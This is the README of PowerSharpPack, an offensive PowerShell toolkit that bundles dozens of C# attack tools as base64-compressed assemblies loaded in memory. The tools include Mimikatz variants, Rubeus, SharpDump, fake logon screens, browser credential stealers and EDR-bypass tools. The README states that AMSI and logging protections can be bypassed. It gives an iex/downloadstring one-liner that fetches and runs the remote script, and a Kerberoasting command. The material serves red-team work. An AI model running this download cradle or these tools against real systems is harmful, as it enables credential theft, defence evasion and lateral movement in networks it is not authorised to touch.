# PowerSharpPack

Many usefull offensive CSharp Projects wraped into Powershell for easy usage.

Why? In my personal opinion offensive Powershell is not dead because of AMSI, Script-block-logging, Constrained Language Mode or other protection features. Any of these mechanisms can be bypassed. Since most new innovative offensive security projects are written in C# I decided to make them usable in powershell as well.

So what did i basically do here? 

1) First of all clone each C# Repo.
2) Set the class and main methods public
3) For some projects i merged pull requests with new features or bug fixes or i had to remove environment.exit statements so that the whole powershell process is not killed for missing parameters and so on
4) Afterwards compiling each binary
5) Gzip-compress and base64-Encode the compiled binary base64 and load it in powershell via `[System.Reflection.Assembly]::Load($DecompressedDecodedBinary)`.

Its a very easy but for many repos time consuming process.

Which tools are included?

 **Internalmonologue**

 Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS
 
 @Credit to: https://github.com/eladshamir/Internal-Monologue

 **Seatbelt**

 Seatbelt is a C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives.
 
 @Credit to: https://github.com/GhostPack/Seatbelt

 **SharpWeb**

 .NET 2.0 CLR project to retrieve saved browser credentials from Google Chrome, Mozilla Firefox and Microsoft Internet Explorer/Edge.
 
 @Credit to: https://github.com/djhohnstein/SharpWeb

 **UrbanBishop**

 Creates a local RW section in UrbanBishop and then maps that section as RX into a remote process. Shellcode loading made easy.
 
 @Credit to: https://github.com/FuzzySecurity/Sharp-Suite

 **SharpUp**

 SharpUp is a C# port of various PowerUp functionality.
 
 @Credit to: https://github.com/GhostPack/SharpUp

 **Rubeus**

 Rubeus is a C# toolset for raw Kerberos interaction and abuses.
 
 @Credit to: https://github.com/GhostPack/Rubeus && https://github.com/gentilkiwi/kekeo/

 **SharPersist**

 Windows persistence toolkit written in C#.
 
 @Credit to: https://github.com/fireeye/SharPersist

 **Sharpview**

 C# implementation of harmj0y's PowerView
 
 @Credit to: https://github.com/tevora-threat/SharpView

 **winPEAS**

 Check the Local Windows Privilege Escalation checklist from book.hacktricks.xyz
 
 @Credit to: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS

 **Lockless**

 Lockless allows for the copying of locked files.
 
 @Credit to: https://github.com/GhostPack/Lockless

 **SharpChromium**

 .NET 4.0 CLR Project to retrieve Chromium data, such as cookies, history and saved logins.
 
 @Credit to: https://github.com/djhohnstein/SharpChromium

 **SharpDPAPI**

 SharpDPAPI is a C# port of some Mimikatz DPAPI functionality.
 
 @Credit to: https://github.com/GhostPack/SharpDPAPI && https://github.com/gentilkiwi/mimikatz/

 **SharpShares**

 Enumerate all network shares in the current domain. Also, can resolve names to IP addresses.
 
 @Credit to: https://github.com/djhohnstein/SharpShares

 **SharpSniper**

 Find specific users in active directory via their username and logon IP address
 
 @Credit to: https://github.com/HunnicCyber/SharpSniper

 **SharpSpray**

 SharpSpray a simple code set to perform a password spraying attack against all users of a domain using LDAP and is compatible with Cobalt Strike.
 
 @Credit to: https://github.com/jnqpblc/SharpSpray

 **Watson**

 Enumerate missing KBs and suggest exploits for useful Privilege Escalation vulnerabilities
 
 @Credit to: https://github.com/rasta-mouse/Watson

 **Grouper2**

 Find vulnerabilities in AD Group Policy
 
 @Credit to: https://github.com/l0ss/Grouper2

 **Tokenvator**

 A tool to elevate privilege with Windows Tokens
 
 @Credit to: https://github.com/0xbadjuju/Tokenvator

 **SauronEye**

 Search tool to find specific files containing specific words, i.e. files containing passwords.
 
 @Credit to: https://github.com/vivami/SauronEye

Just load the main script with

`iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpPack.ps1')`


and choose the tool as switch parameter for example:

`PowerSharpPack -seatbelt -Command "AMSIProviders"`

![alt text](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/raw/master/images/Example.JPG)

If you want to pass multiple parameters to the binary you can just use quotation marks like:

`PowerSharpPack -Rubeus -Command "kerberoast /outfile:Roasted.txt"`

If you dont want to load all binaries for reasons you can use the per binary Powershell scripts located in the PowerSharpBinaries folder.

Projects which are also available as standalone powershell script:

 **SharpCloud**

 Simple C# for checking for the existence of credential files related to AWS, Microsoft Azure, and Google Compute.
 
 @Credit to: https://github.com/chrismaddalena/SharpCloud

 **SharpSSDP**

 SSDP Service Discovery
 
 @Credit to: https://github.com/rvrsh3ll/SharpSSDP

 **DAFT**

 DAFT: Database Audit Framework & Toolkit
 
 @Credit to: https://github.com/NetSPI/DAFT

 **Get-RBCD-Threaded**

 Tool to discover Resource-Based Constrained Delegation attack paths in Active Directory environments
 
 @Credit to: https://github.com/FatRodzianko/Get-RBCD-Threaded

 **SharpGPO-RemoteAccessPolicies**

 A C# tool for enumerating remote access policies through group policy.
 
 @Credit to: https://github.com/FSecureLABS/SharpGPO-RemoteAccessPolicies

 **SharpAllowedToAct**

 Computer object takeover through Resource-Based Constrained Delegation (msDS-AllowedToActOnBehalfOfOtherIdentity)
 
 @Credit to: https://github.com/pkb1s/SharpAllowedToAct

 **WireTap**

 .NET 4.0 Project to interact with video, audio and keyboard hardware.
 
 @Credit to: https://github.com/djhohnstein/WireTap

 **SharpClipboard**

 C# Clipboard Monitor
 
 @Credit to: https://github.com/slyd0g/SharpClipboard

 **SharpPrinter**

 Discover Printers + check for vulns
 
 @Credit to: https://github.com/rvrsh3ll/SharpPrinter

 **SharpHide**

 Tool to create hidden registry keys.
 
 @Credit to: https://github.com/outflanknl/SharpHide

 **SpoolSample**

 PoC tool to coerce Windows hosts authenticate to other machines via the MS-RPRN RPC interface. This is possible via other protocols as well.
 
 @Credit to: https://github.com/leechristensen/SpoolSample

 **SharpGPOAbuse**

 SharpGPOAbuse is a .NET application written in C# that can be used to take advantage of a user's edit rights on a Group Policy Object (GPO) in order to compromise the objects that are controlled by that GPO.
 
 @Credit to: https://github.com/FSecureLABS/SharpGPOAbuse

 **SharpDump**

 SharpDump is a C# port of PowerSploit's Out-Minidump.ps1 functionality.
 
 @Credit to: https://github.com/GhostPack/SharpDump

 **SharpHound3**

 C# Data Collector for the BloodHound Project, Version 3
 
 @Credit to: https://github.com/BloodHoundAD/SharpHound3

 **SharpLocker**

 SharpLocker helps get current user credentials by popping a fake Windows lock screen, all output is sent to Console which works perfect for Cobalt Strike.
 
 @Credit to: https://github.com/Pickfordmatt/SharpLocker

 **Eyewitness**

 EyeWitness is designed to take screenshots of websites, provide some server header info, and identify default credentials if possible.
 
 @Credit to: https://github.com/FortyNorthSecurity/EyeWitness

 **FakeLogonScreen**

 Fake Windows logon screen to steal passwords
 
 @Credit to: https://github.com/bitsadmin/fakelogonscreen

 **P0wnedShell**

 PowerShell Runspace Post Exploitation Toolkit
 
 @Credit to: https://github.com/Cn33liz/p0wnedShell
 
 **Safetykatz**
 
 SafetyKatz is a combination of slightly modified version of @gentilkiwi's Mimikatz project and @subTee's .NET PE Loader
 I modified this one again with my own obfuscated Mimikatz Version.
 
 @Credit to: https://github.com/GhostPack/SafetyKatz

**InveighZero**

Windows C# LLMNR/mDNS/NBNS/DNS/DHCPv6 spoofer/man-in-the-middle tool .

 @Credit to: https://github.com/Kevin-Robertson/InveighZero
 
 **SharpSploit**
 
 SharpSploit is a .NET post-exploitation library written in C#.
 
 @Credit to: https://github.com/cobbr/SharpSploit


 **Snaffler**

 A tool for pentesters to help find delicious candy, by @l0ss and @Sh3r4 ( Twitter: @/mikeloss and @/sh3r4_hax ).
 
 @Credit to: https://github.com/SnaffCon/Snaffler

**BadPotato**

 itm4ns Printspoofer in C#.
 
 @Credit to: https://github.com/BeichenDream/BadPotato
 
 
 **BetterSafetyKatz**
 
Fork of SafetyKatz that dynamically fetches the latest pre-compiled release of Mimikatz directly from gentilkiwi GitHub repo, runtime patches signatures and uses SharpSploit DInvoke to PE-Load into memory.

 @Credit to: https://github.com/Flangvik/BetterSafetyKatz

**SharpKatz**
 
C# Port of mimikatz sekurlsa::logonpasswords, sekurlsa::ekeys and lsadump::dcsync commands.

 @Credit to: https://github.com/b4rtik/SharpKatz

**Gopher**

C# tool to discover low hanging fruits.

@Credit to: https://github.com/EncodeGroup/Gopher

**SharpOxidResolver**

IOXIDResolver from AirBus Security/PingCastle.

@Credit to: https://github.com/vletoux/pingcastle/

**SharpBlock**

A method of bypassing EDR's active projection DLL's by preventing entry point exection.

@Credit to: https://github.com/CCob/SharpBlock

**SharpLoginPrompt**

This Program creates a login prompt to gather username and password of the current user. This project allows red team to phish username and password of the current user without touching lsass and having adminitrator credentials on the system.

@Credit to: https://github.com/shantanu561993/SharpLoginPrompt

**ThunderFox**

Retrieves data (contacts, emails, history, cookies and credentials) from Thunderbird and Firefox.

**StickyNotesExtract**

Extracts data from the Windows Sticky Notes database. Works on Windows 10 Build 1607 and higher. This project doesn't rely on any external dependencies.

@Credit to: https://github.com/V1V1/SharpScribbles


**SCShell**

Fileless lateral movement tool that relies on ChangeServiceConfigA to run command.

@Credit to: https://github.com/Mr-Un1k0d3r/SCShell

**SharpMapExec**

A sharpen version of [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec). Use quotation marks if you want to pass multiple parameters to the binary.

@Credit to: https://github.com/cube0x0/SharpMapExec
